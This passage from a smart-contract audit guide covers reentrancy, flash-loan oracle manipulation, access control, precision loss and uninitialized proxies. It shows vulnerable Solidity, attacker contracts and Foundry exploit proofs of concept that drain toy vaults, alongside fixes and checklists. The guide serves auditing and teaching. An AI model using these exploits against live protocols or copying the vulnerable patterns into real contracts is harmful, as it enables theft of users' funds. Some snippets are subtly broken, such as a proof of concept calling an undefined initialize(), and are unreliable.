    - (success) = msg.sender.call{value: amount}()  (Line 52)
    State variables written after the call(s):
    - balances[msg.sender] -= amount  (Line 54)
```

**Aderyn Output:**
```markdown
### [H-1] Reentrancy Vulnerability
**Location:** contracts/Vault.sol:52-54
**Description:** External call before state change violates CEI pattern
```

**Manual Indicators:**
- External call (`.call`, `.transfer`, `.send`) before state changes
- Token transfers (ERC-777, ERC-721, ERC-1155 with callbacks)
- Calls to untrusted contracts
- Missing `ReentrancyGuard` or `nonReentrant` modifier

#### Vulnerable Code

```solidity
contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // VULNERABLE: State change AFTER external call
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // External call BEFORE state change
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // State change AFTER external call = REENTRANCY
        balances[msg.sender] -= amount;
    }

    function getBalance(address user) public view returns (uint256) {
        return balances[user];
    }
}
```

#### Exploitation

**Attack Contract:**
```solidity
contract ReentrancyAttacker {
    VulnerableVault public vault;
    uint256 public attackCount;
    uint256 constant ATTACK_AMOUNT = 1 ether;

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
    }

    // Attack entry point
    function attack() external payable {
        require(msg.value == ATTACK_AMOUNT, "Send 1 ETH to attack");
        vault.deposit{value: ATTACK_AMOUNT}();
        vault.withdraw(ATTACK_AMOUNT);
    }

    // Reentrancy callback
    receive() external payable {
        // Reenter withdraw() before balance is updated
        if (address(vault).balance >= ATTACK_AMOUNT && attackCount < 10) {
            attackCount++;
            vault.withdraw(ATTACK_AMOUNT);  // REENTRY
        }
    }
}
```

**Foundry Exploit PoC:**
```solidity
contract ReentrancyExploitTest is Test {
    VulnerableVault public vault;
    ReentrancyAttacker public attacker;

    function setUp() public {
        vault = new VulnerableVault();
        attacker = new ReentrancyAttacker(address(vault));

        // Fund vault with victim deposits
        vm.deal(address(vault), 10 ether);
    }

    function testReentrancyExploit() public {
        // Initial state
        assertEq(address(vault).balance, 10 ether);
        assertEq(address(attacker).balance, 0);

        // Execute attack with 1 ETH
        vm.deal(address(this), 1 ether);
        attacker.attack{value: 1 ether}();

        // Verify exploit SUCCESS
        assertEq(address(vault).balance, 0, "Vault DRAINED");
        assertGt(address(attacker).balance, 10 ether, "Attacker stole all funds");

        console.log("Vault balance:", address(vault).balance);
        console.log("Attacker balance:", address(attacker).balance);
        console.log("Attack count:", attacker.attackCount());
    }
}
```

**Attack Flow:**
1. Attacker deposits 1 ETH
2. Attacker calls `withdraw(1 ETH)`
3. Vault sends 1 ETH → triggers attacker's `receive()`
4. `receive()` calls `withdraw(1 ETH)` again (REENTRY)
5. Vault checks balance (still 1 ETH, not yet updated)
6. Vault sends another 1 ETH
7. Repeat until vault is drained
8. Finally, all balance updates execute (too late)

#### Remediation

**Fix 1: Checks-Effects-Interactions (CEI) Pattern**
```solidity
function withdraw(uint256 amount) public {
    require(balances[msg.sender] >= amount, "Insufficient balance");

    // EFFECT: Update state BEFORE external call
    balances[msg.sender] -= amount;

    // INTERACTION: External call AFTER state change
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}
```

**Fix 2: ReentrancyGuard (OpenZeppelin)**
```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureVault is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function withdraw(uint256 amount) public nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] -= amount;
    }
}
```

**Fix 3: Pull Over Push Pattern**
```solidity
contract SecureVault {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public pendingWithdrawals;

    function requestWithdrawal(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        pendingWithdrawals[msg.sender] += amount;
    }

    function withdraw() public {
        uint256 amount = pendingWithdrawals[msg.sender];
        require(amount > 0, "No pending withdrawal");

        pendingWithdrawals[msg.sender] = 0;  // Update BEFORE transfer

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```

#### Real-World Examples

- **The DAO Hack (2016):** $60M stolen via reentrancy → Ethereum hard fork
- **Cream Finance (2021):** $130M stolen via reentrancy in flash loan
- **Grim Finance (2021):** $30M stolen via read-only reentrancy

#### Prevention Checklist

- ✅ Follow CEI pattern (Checks-Effects-Interactions)
- ✅ Use `nonReentrant` modifier from OpenZeppelin
- ✅ Update state BEFORE external calls
- ✅ Prefer `transfer()` over `.call()` when possible (2300 gas limit)
- ✅ Test with Echidna/Foundry fuzzing
- ✅ Check for read-only reentrancy (view functions)

---

### Finding 2: Oracle Manipulation via Flash Loans (Critical)

**Immunefi Classification:** V03 - Oracle/Price Manipulation
**Severity:** Critical
**Likelihood:** Medium (requires flash loan integration)
**Impact:** Protocol insolvency, fund theft

#### Detection

**Manual Indicators:**
- Single price oracle source (no aggregation)
- Price fetched from AMM reserves directly
- No time-weighted average price (TWAP)
- Missing staleness checks
- Flash loan-vulnerable logic

**Code Pattern:**
```solidity
// VULNERABLE: Single price source from AMM
function getPrice() public view returns (uint256) {
    (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
    return (reserve1 * 1e18) / reserve0;  // Instant price, manipulable
}
```

#### Vulnerable Code

```solidity
contract VulnerableLending {
    IUniswapV2Pair public tokenPair;

    function getCollateralValue(uint256 tokenAmount) public view returns (uint256) {
        // VULNERABLE: Instant AMM price, no TWAP
        (uint112 reserve0, uint112 reserve1,) = tokenPair.getReserves();
        uint256 price = (reserve1 * 1e18) / reserve0;
        return (tokenAmount * price) / 1e18;
    }

    function borrow(uint256 collateralAmount, uint256 borrowAmount) public {
        uint256 collateralValue = getCollateralValue(collateralAmount);
        require(collateralValue >= borrowAmount * 150 / 100, "Insufficient collateral");

        // Transfer collateral and borrow
        collateralToken.transferFrom(msg.sender, address(this), collateralAmount);
        borrowToken.transfer(msg.sender, borrowAmount);
    }
}
```

#### Exploitation

**Attack Flow:**
1. Take flash loan of 100,000 ETH from Aave
2. Swap 50,000 ETH → Token on Uniswap (inflates Token price 10×)
3. Use inflated price to borrow maximum from VulnerableLending
4. Swap back Token → ETH on Uniswap (price returns to normal)
5. Repay flash loan
6. Keep borrowed funds (protocol now under-collateralized)

**Foundry Exploit PoC:**
```solidity
contract OracleManipulationExploit is Test {
    VulnerableLending public lending;
    IUniswapV2Pair public pair;
    IERC20 public token;
    IERC20 public borrowToken;

    function testOracleManipulation() public {
        // Setup: Normal price 1 Token = 0.1 ETH
        uint256 normalPrice = lending.getCollateralValue(1e18);
        console.log("Normal price:", normalPrice);

        // Step 1: Flash loan 100,000 ETH
        vm.deal(address(this), 100_000 ether);

        // Step 2: Swap 50,000 ETH → Token (inflate price)
        uniswapRouter.swapExactETHForTokens{value: 50_000 ether}(
            0,
            getPath(WETH, address(token)),
            address(this),
            block.timestamp
        );

        // Check manipulated price (now 10× higher)
        uint256 manipulatedPrice = lending.getCollateralValue(1e18);
        console.log("Manipulated price:", manipulatedPrice);
        assertGt(manipulatedPrice, normalPrice * 9);  // 10× inflation

        // Step 3: Borrow maximum with inflated collateral value
        uint256 collateral = 100 * 1e18;  // 100 tokens
        uint256 maxBorrow = lending.getCollateralValue(collateral) * 100 / 150;
        lending.borrow(collateral, maxBorrow);

        // Step 4: Swap back Token → ETH (price returns)
        uint256 tokenBalance = token.balanceOf(address(this));
        uniswapRouter.swapExactTokensForETH(
            tokenBalance,
            0,
            getPath(address(token), WETH),
            address(this),
            block.timestamp
        );

        // Step 5: Verify exploit - borrowed more than collateral worth
        uint256 actualCollateralValue = lending.getCollateralValue(collateral);
        assertLt(actualCollateralValue, maxBorrow);  // Under-collateralized!

        console.log("Borrowed:", maxBorrow);
        console.log("Actual collateral value:", actualCollateralValue);
        console.log("Profit:", maxBorrow - actualCollateralValue);
    }
}
```

#### Remediation

**Fix 1: Chainlink Price Feeds**
```solidity
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract SecureLending {
    AggregatorV3Interface public priceFeed;

    function getCollateralValue(uint256 tokenAmount) public view returns (uint256) {
        (
            uint80 roundID,
            int256 price,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        ) = priceFeed.latestRoundData();

        // Staleness check
        require(updatedAt >= block.timestamp - 3600, "Stale price");
        require(answeredInRound >= roundID, "Stale round");
        require(price > 0, "Invalid price");

        return (tokenAmount * uint256(price)) / 1e18;
    }
}
```

**Fix 2: TWAP (Time-Weighted Average Price)**
```solidity
contract SecureLending {
    IUniswapV3Pool public pool;
    uint32 public constant TWAP_PERIOD = 1800;  // 30 minutes

    function getCollateralValue(uint256 tokenAmount) public view returns (uint256) {
        uint32[] memory secondsAgos = new uint32[](2);
        secondsAgos[0] = TWAP_PERIOD;
        secondsAgos[1] = 0;

        (int56[] memory tickCumulatives,) = pool.observe(secondsAgos);

        int24 timeWeightedAverageTick = int24(
            (tickCumulatives[1] - tickCumulatives[0]) / int56(uint56(TWAP_PERIOD))
        );

        uint256 price = getSqrtRatioAtTick(timeWeightedAverageTick);
        return (tokenAmount * price) / 1e18;
    }
}
```

**Fix 3: Multiple Oracle Sources**
```solidity
contract SecureLending {
    AggregatorV3Interface public chainlinkFeed;
    IUniswapV3Pool public uniswapPool;

    function getCollateralValue(uint256 tokenAmount) public view returns (uint256) {
        uint256 chainlinkPrice = getChainlinkPrice();
        uint256 uniswapPrice = getUniswapTWAP();

        // Require prices within 5% of each other
        uint256 maxPrice = chainlinkPrice > uniswapPrice ? chainlinkPrice : uniswapPrice;
        uint256 minPrice = chainlinkPrice < uniswapPrice ? chainlinkPrice : uniswapPrice;
        require(maxPrice * 95 / 100 <= minPrice * 105 / 100, "Price deviation");

        // Use minimum price (conservative)
        uint256 price = minPrice;
        return (tokenAmount * price) / 1e18;
    }
}
```

#### Real-World Examples

- **Beanstalk ($182M, April 2022):** Flash loan manipulated governance, drained treasury
- **Mango Markets ($110M, October 2022):** Oracle manipulation via low-liquidity pairs
- **Cream Finance V1 ($25M, August 2021):** Price manipulation + reentrancy

#### Prevention Checklist

- ✅ Use Chainlink oracles (decentralized price feeds)
- ✅ Implement TWAP (30+ minute window)
- ✅ Aggregate multiple oracle sources
- ✅ Add price deviation checks (5-10% max)
- ✅ Check oracle staleness (< 1 hour)
- ✅ Add circuit breakers for extreme price moves
- ✅ Test with mainnet fork + simulated flash loans

---

### Finding 3: Access Control Bypass (High)

**Immunefi Classification:** V04 - Weak Access Control
**Severity:** High
**Likelihood:** Medium (depends on visibility)
**Impact:** Unauthorized admin actions, fund theft

#### Detection

**Slither Output:**
```
contracts/Vault.sol:78-80
  Dangerous function: adminWithdraw() is public but has no access control
  Anyone can call this function and drain the contract
```

**Manual Indicators:**
- `public` or `external` functions performing privileged actions
- Missing `onlyOwner`, `onlyAdmin`, or role-based modifiers
- Functions transferring funds without access control
- Proxy upgrade functions without protection

#### Vulnerable Code

```solidity
contract VulnerableVault {
    address public owner;
    mapping(address => uint256) public balances;

    constructor() {
        owner = msg.sender;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // VULNERABLE: No access control!
    function adminWithdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    // VULNERABLE: Owner can be changed by anyone!
    function transferOwnership(address newOwner) public {
        owner = newOwner;
    }

    // VULNERABLE: Anyone can pause
    bool public paused;
    function pause() public {
        paused = true;
    }
}
```

#### Exploitation

**Attack:**
```solidity
contract AccessControlExploit is Test {
    VulnerableVault public vault;
    address public attacker;

    function setUp() public {
        vault = new VulnerableVault();
        attacker = makeAddr("attacker");

        // Vault has 10 ETH from user deposits
        vm.deal(address(vault), 10 ether);
    }

    function testAdminWithdrawBypass() public {
        // Attacker (non-owner) calls adminWithdraw
        vm.startPrank(attacker);

        uint256 balanceBefore = attacker.balance;
        vault.adminWithdraw();  // No access control check!
        uint256 balanceAfter = attacker.balance;

        // Verify exploit
        assertEq(address(vault).balance, 0, "Vault drained");
        assertEq(balanceAfter - balanceBefore, 10 ether, "Attacker stole funds");
    }

    function testOwnershipTakeover() public {
        address originalOwner = vault.owner();

        // Attacker takes ownership
        vm.prank(attacker);
        vault.transferOwnership(attacker);

        // Verify takeover
        assertEq(vault.owner(), attacker, "Ownership stolen");
        assertNotEq(vault.owner(), originalOwner, "Original owner lost access");
    }
}
```

#### Remediation

**Fix 1: OpenZeppelin Ownable**
```solidity
import "@openzeppelin/contracts/access/Ownable.sol";

contract SecureVault is Ownable {
    mapping(address => uint256) public balances;

    constructor() Ownable(msg.sender) {}

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // onlyOwner modifier restricts access
    function adminWithdraw() public onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }
}
```

**Fix 2: Role-Based Access Control (RBAC)**
```solidity
import "@openzeppelin/contracts/access/AccessControl.sol";

contract SecureVault is AccessControl {
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    bytes32 public constant OPERATOR_ROLE = keccak256("OPERATOR_ROLE");

    constructor() {
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(ADMIN_ROLE, msg.sender);
    }

    function adminWithdraw() public onlyRole(ADMIN_ROLE) {
        payable(msg.sender).transfer(address(this).balance);
    }

    function pause() public onlyRole(OPERATOR_ROLE) {
        _pause();
    }
}
```

**Fix 3: Multi-Sig (Gnosis Safe)**
```solidity
contract SecureVault {
    address public multisig;  // Gnosis Safe address

    constructor(address _multisig) {
        require(_multisig != address(0), "Invalid multisig");
        multisig = _multisig;
    }

    modifier onlyMultisig() {
        require(msg.sender == multisig, "Not multisig");
        _;
    }

    function adminWithdraw() public onlyMultisig {
        payable(multisig).transfer(address(this).balance);
    }

    function setMultisig(address newMultisig) public onlyMultisig {
        require(newMultisig != address(0), "Invalid multisig");
        multisig = newMultisig;
    }
}
```

#### Real-World Examples

- **Parity Multi-Sig Wallet ($30M, 2017):** Missing access control on `initWallet()`
- **Poly Network ($611M, 2021):** Access control bypass in cross-chain bridge
- **Ronin Bridge ($625M, 2022):** Compromised validator keys (access control failure)

#### Prevention Checklist

- ✅ Use OpenZeppelin Ownable or AccessControl
- ✅ Review all `public`/`external` functions for access control
- ✅ Implement principle of least privilege
- ✅ Use multi-sig for critical functions
- ✅ Test access control with multiple roles (Foundry)
- ✅ Add events for privileged actions (auditability)

---

### Finding 4: Integer Overflow & Precision Loss (Medium-High)

**Immunefi Classification:** V02 - Incorrect Calculation / V06 - Rounding Error
**Severity:** Medium to High (depends on context)
**Likelihood:** Medium (less common with Solidity >=0.8.0)
**Impact:** Loss of funds, incorrect accounting

#### Detection

**Manual Indicators:**
- Arithmetic operations without SafeMath (Solidity <0.8.0)
- Division before multiplication
- Token decimal mismatches (6 vs 18 decimals)
- Unchecked blocks bypassing overflow protection
- Rounding in share/token calculations

**Mythril Output:**
```
==== Integer Overflow ====
SWC ID: 101
Severity: High
Contract: Vault
Function name: calculateReward(uint256)
The arithmetic operation can result in integer overflow.

balanceOf[user] * rewardMultiplier

Possible values:
balanceOf[user] = 1000000000000000000000000
rewardMultiplier = 1000000
Result: OVERFLOW (exceeds uint256 max)
```

#### Vulnerable Code

**Example 1: Division Before Multiplication**
```solidity
contract VulnerableRewards {
    uint256 constant PRECISION = 1e18;

    // VULNERABLE: Division before multiplication loses precision
    function calculateReward(uint256 stakedAmount, uint256 rewardRate) public pure returns (uint256) {
        // rewardRate = 5% = 50000 (out of 1000000)
        // If stakedAmount = 100, this returns 0!
        return (stakedAmount / 1000000) * rewardRate;  // WRONG ORDER
    }
}
```

**Example 2: Decimal Mismatch**
```solidity
contract VulnerableSwap {
    IERC20 public tokenA;  // 18 decimals (ETH)
    IERC20 public tokenB;  // 6 decimals (USDC)

    // VULNERABLE: Doesn't account for decimal difference
    function swap(uint256 amountA) public {
        uint256 amountB = amountA;  // BUG: 1:1 ratio ignores decimals
        tokenA.transferFrom(msg.sender, address(this), amountA);
        tokenB.transfer(msg.sender, amountB);
    }
}
```

**Example 3: Unchecked Overflow (Solidity >=0.8.0)**
```solidity
contract VulnerableCounter {
    uint256 public counter;

    // VULNERABLE: unchecked bypasses overflow protection
    function increment(uint256 amount) public {
        unchecked {
            counter += amount;  // Can overflow back to 0
        }
    }
}
```

#### Exploitation

**Foundry Exploit PoC - Precision Loss:**
```solidity
contract PrecisionLossExploit is Test {
    VulnerableRewards public rewards;

    function setUp() public {
        rewards = new VulnerableRewards();
    }

    function testPrecisionLoss() public {
        uint256 stakedAmount = 100;  // Small amount
        uint256 rewardRate = 50000;  // 5%

        uint256 reward = rewards.calculateReward(stakedAmount, rewardRate);

        // Expected: (100 * 50000) / 1000000 = 5
        // Actual: (100 / 1000000) * 50000 = 0 * 50000 = 0
        assertEq(reward, 0, "Precision loss: reward should be 5, got 0");

        console.log("Expected reward: 5");
        console.log("Actual reward:", reward);
    }
}
```

**Foundry Exploit PoC - Decimal Mismatch:**
```solidity
contract DecimalMismatchExploit is Test {
    VulnerableSwap public swap;
    MockERC20 public tokenA;  // 18 decimals
    MockERC20 public tokenB;  // 6 decimals

    function testDecimalMismatch() public {
        // Setup: 1 TokenA (18 decimals) should equal 1000 TokenB (6 decimals)
        // Attacker swaps 1 TokenA
        uint256 amountA = 1e18;  // 1 TokenA (1.0 with 18 decimals)

        tokenA.approve(address(swap), amountA);
        swap.swap(amountA);

        // Attacker receives 1e18 TokenB instead of 1e6 TokenB
        uint256 received = tokenB.balanceOf(address(this));

        // Expected: 1e6 (1.0 with 6 decimals)
        // Actual: 1e18 (1 trillion TokenB due to decimal mismatch)
        assertEq(received, 1e18, "Decimal exploit");
        console.log("Expected to receive: 1,000,000 TokenB");
        console.log("Actually received: 1,000,000,000,000,000,000 TokenB");
    }
}
```

#### Remediation

**Fix 1: Correct Order of Operations**
```solidity
function calculateReward(uint256 stakedAmount, uint256 rewardRate) public pure returns (uint256) {
    // Multiply BEFORE divide to preserve precision
    return (stakedAmount * rewardRate) / 1000000;  // CORRECT
}
```

**Fix 2: Use Higher Precision**
```solidity
contract SecureRewards {
    uint256 constant PRECISION = 1e18;

    function calculateReward(uint256 stakedAmount, uint256 rewardRate) public pure returns (uint256) {
        // Use 18 decimal precision internally
        return (stakedAmount * rewardRate * PRECISION) / (1000000 * PRECISION);
    }
}
```

**Fix 3: Handle Decimal Mismatches**
```solidity
contract SecureSwap {
    uint8 constant DECIMALS_A = 18;
    uint8 constant DECIMALS_B = 6;

    function swap(uint256 amountA) public {
        // Convert to common precision (18 decimals)
        uint256 normalizedAmountA = amountA;  // Already 18 decimals
        uint256 normalizedAmountB = amountA * (10 ** (DECIMALS_A - DECIMALS_B));

        // Get price from oracle
        uint256 price = getPrice();  // e.g., 1000e18 (1 TokenA = 1000 TokenB)

        // Calculate amountB with proper decimals
        uint256 amountB = (normalizedAmountA * price) / 1e18;
        amountB = amountB / (10 ** (DECIMALS_A - DECIMALS_B));  // Convert to 6 decimals

        tokenA.transferFrom(msg.sender, address(this), amountA);
        tokenB.transfer(msg.sender, amountB);
    }
}
```

**Fix 4: Avoid Unchecked Unless Necessary**
```solidity
contract SecureCounter {
    uint256 public counter;

    function increment(uint256 amount) public {
        // Let Solidity's built-in overflow protection work
        counter += amount;  // Reverts on overflow (Solidity >=0.8.0)
    }

    // Only use unchecked when overflow is DESIRED and SAFE
    function incrementUnchecked(uint256 amount) public {
        unchecked {
            counter += amount;  // Only if you WANT wrapping behavior
        }
    }
}
```

#### Real-World Examples

- **BatchOverflow/ProxyOverflow (2018):** Integer overflow in multiple ERC-20 tokens
- **B Protocol ($1.5M, 2021):** Precision loss in liquidation calculations
- **88mph ($100K, 2021):** Rounding error in fixed-rate interest protocol

#### Prevention Checklist

- ✅ Use Solidity >=0.8.0 (automatic overflow protection)
- ✅ Multiply before divide to preserve precision
- ✅ Use consistent decimal precision (1e18 recommended)
- ✅ Handle token decimal mismatches explicitly
- ✅ Avoid `unchecked` unless overflow is intended
- ✅ Test with extreme values (0, 1, max uint256)
- ✅ Use Halmos to prove no overflow possible

---

### Finding 5: Uninitialized Proxy (High)

**Immunefi Classification:** V09 - Uninitialized Proxy
**Severity:** High to Critical
**Likelihood:** Low (requires deployment error)
**Impact:** Proxy takeover, fund theft, protocol destruction

#### Detection

**Manual Indicators:**
- Upgradeable contracts using UUPS or Transparent Proxy pattern
- `initialize()` function not called immediately after deployment
- Missing `initializer` modifier
- No `disableInitializers()` in constructor
- Implementation contract can be self-destructed

**Slither Output:**
```
contracts/VaultImplementation.sol:
  VaultImplementation.initialize() should be protected by initializer modifier
  VaultImplementation is upgradeable but constructor doesn't call _disableInitializers()
  Implementation contract is vulnerable to selfdestruct attack
```

#### Vulnerable Code

```solidity
// VULNERABLE Implementation
contract VulnerableVaultImplementation {
    address public owner;
    mapping(address => uint256) public balances;

    // VULNERABLE: No initializer protection
    // VULNERABLE: Constructor in implementation (doesn't work with proxies!)
    constructor() {
        owner = msg.sender;  // This sets owner in implementation, not proxy!
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function adminWithdraw() public {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    // VULNERABLE: Anyone can call this on implementation contract
    function destroy() public {
        require(msg.sender == owner, "Not owner");
        selfdestruct(payable(owner));
    }
}

// Proxy deployment (VULNERABLE)
contract VulnerableProxy {
    address public implementation;

    constructor(address _implementation) {
        implementation = _implementation;
    }

    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}
```

#### Exploitation

**Attack Flow:**
1. Protocol deploys implementation contract
2. Protocol deploys proxy pointing to implementation
3. Protocol forgets to call `proxy.initialize()` ← MISTAKE
4. Attacker calls `implementation.initialize()` directly
5. Attacker becomes owner of implementation
6. Attacker calls `implementation.destroy()` (selfdestruct)
7. Proxy now points to destroyed contract (address with no code)
8. All proxy calls fail, funds locked forever

**Foundry Exploit PoC:**
```solidity
contract UninitializedProxyExploit is Test {
    VulnerableVaultImplementation public implementation;
    VulnerableProxy public proxy;
    VulnerableVaultImplementation public proxyAsVault;

    address public attacker;

    function setUp() public {
        attacker = makeAddr("attacker");

        // Protocol deploys implementation and proxy
        implementation = new VulnerableVaultImplementation();
        proxy = new VulnerableProxy(address(implementation));
        proxyAsVault = VulnerableVaultImplementation(address(proxy));

        // Protocol FORGETS to call initialize() on proxy!
        // proxyAsVault.initialize();  ← MISSING

        // Users deposit funds
        vm.deal(address(this), 10 ether);
        proxyAsVault.deposit{value: 10 ether}();
    }

    function testUninitializedProxyExploit() public {
        // Step 1: Attacker initializes implementation contract directly
        vm.startPrank(attacker);
        implementation.initialize();  // Attacker becomes implementation owner!

        // Verify attacker owns implementation
        assertEq(implementation.owner(), attacker, "Attacker owns implementation");

        // Step 2: Attacker destroys implementation
        implementation.destroy();

        vm.stopPrank();

        // Step 3: Verify proxy is now broken
        assertEq(address(implementation).code.length, 0, "Implementation destroyed");

        // Step 4: All proxy calls now fail
        vm.expectRevert();
        proxyAsVault.deposit{value: 1 ether}();

        // Step 5: Funds are locked forever
        console.log("Proxy balance (locked):", address(proxy).balance);
        console.log("Implementation code size:", address(implementation).code.length);
    }
}
```

#### Remediation

**Fix 1: Proper Initialization (OpenZeppelin)**
```solidity
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";

contract SecureVaultImplementation is Initializable, OwnableUpgradeable {
    mapping(address => uint256) public balances;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();  // Prevent initialization of implementation
    }

    function initialize() public initializer {
        __Ownable_init(msg.sender);  // Initialize ownership in proxy storage
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function adminWithdraw() public onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }
}

// Deployment script
function deployProxy() public {
    SecureVaultImplementation implementation = new SecureVaultImplementation();
    ERC1967Proxy proxy = new ERC1967Proxy(
        address(implementation),
        abi.encodeCall(implementation.initialize, ())  // Initialize immediately!
    );
}
```

**Fix 2: No Selfdestruct in Upgradeable Contracts**
```solidity
contract SecureVaultImplementation is Initializable, OwnableUpgradeable {
    // REMOVED: No selfdestruct function in upgradeable contracts!

    // If emergency stop needed, use pause instead
    function pause() public onlyOwner {
        _pause();
    }
}
```

**Fix 3: UUPS Proxies with Authorization**
```solidity
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract SecureVaultImplementation is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    constructor() {
        _disableInitializers();
    }

    function initialize() public initializer {
        __Ownable_init(msg.sender);
        __UUPSUpgradeable_init();
    }

    // Only owner can upgrade
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}
```

#### Real-World Examples

- **Parity Multi-Sig ($300M, 2017):** Uninitialized implementation + selfdestruct = funds locked
- **Wormhole Exploit Risk:** Uninitialized guardian set could allow takeover
- **Audius ($6M, 2022):** Malicious proposal exploited uninitialized proxy

#### Prevention Checklist

- ✅ Use OpenZeppelin's `Initializable` pattern
- ✅ Call `_disableInitializers()` in implementation constructor
- ✅ Use `initializer` modifier on `initialize()`
- ✅ Initialize proxy in deployment transaction (atomic)
- ✅ NEVER use `selfdestruct` in upgradeable contracts
- ✅ Use UUPS with `_authorizeUpgrade` protection
- ✅ Test initialization in deployment scripts
- ✅ Verify proxy initialization on-chain after deployment

---

## Reference Resources

### Local Resources (Dynamic Discovery)

**Web3 Security:** `Glob: private/books/development/*smart-contract*` or use WebFetch for DeFiHackLabs

**Books:** `Glob: private/books/development/*smart-contract*` or see `private/docs/book-catalog.md`

### Web Resources

**DeFiHackLabs:**
- Repository: https://github.com/SunWeb3Sec/DeFiHackLabs
- Use: Learn from real exploit patterns

**Immunefi Top 10:**
- Website: https://immunefi.com/immunefi-top-10/
- Use: Systematic vulnerability testing

**Additional Resources:**
- OpenZeppelin Contracts: https://docs.openzeppelin.com/contracts/
- Trail of Bits Security Blog: https://blog.trailofbits.com/category/security/
- Secureum: https://secureum.substack.com/

---

**Created:** 2025-12-01
**Framework:** Intelligence Adjacent (IA) - Security Testing
**Version:** 1.0
